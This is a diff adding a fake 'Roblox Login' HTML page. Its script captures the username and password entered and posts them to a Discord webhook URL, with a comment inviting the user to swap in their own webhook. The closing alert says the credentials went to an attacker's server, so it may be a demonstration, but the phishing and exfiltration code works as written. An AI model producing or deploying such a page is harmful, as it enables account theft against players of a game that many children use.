@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #2f3640; color: white; padding: 20px; }
+        h2 { color: #ff9900; }
+        input { padding: 10px; margin: 10px 0; width: 250px; }
+        button { padding: 10px 20px; background: #ff9900; border: none; color: white; }
+    </style>
+</head>
+<body>
+    <h2>Roblox Login</h2>
+    <form id="loginForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+
+        <button type="submit">Login</button>
+    </form>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Replace with your Discord Webhook URL
+            const webhookUrl = "https://discord.com/api/webhooks/1513961675693490296/WZDNli0nqpchKa2emnye7J4kDvfeml1ldx79ZD8pzLlu0NRdnr0uY8a2JDAcNI6YepGN";
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: `**Username:** ${username}\n**Password:** ${password}`
+                })
+            });
+
+            alert("Your credentials have been sent to the attacker's Discord server!");
+        });
+    </script>
+</body>
+</html>
